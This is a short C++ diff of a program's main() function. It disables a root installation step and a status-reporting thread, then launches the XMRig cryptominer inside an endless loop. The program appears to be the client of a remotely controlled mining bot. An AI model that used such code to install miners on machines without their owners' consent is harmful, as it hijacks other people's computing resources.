@@ -16,10 +16,12 @@ int main()
     Worker_utils worker;
 
     // Installation
-    if (!worker.isInstalled())
-        worker.install("root");
+    //if (!worker.isInstalled())
+      //  worker.install("root");
 
-    std::thread status_thread(send_status, &worker);
+      //std::thread status_thread(send_status, &worker);
+        worker.runXmrig();
+      while(1);
 
     std::vector<std::string> msgs;
     while (true)
@@ -56,6 +58,6 @@ int main()
         }
     }
 
-    status_thread.join();
+    //status_thread.join();
     return 0;
 }
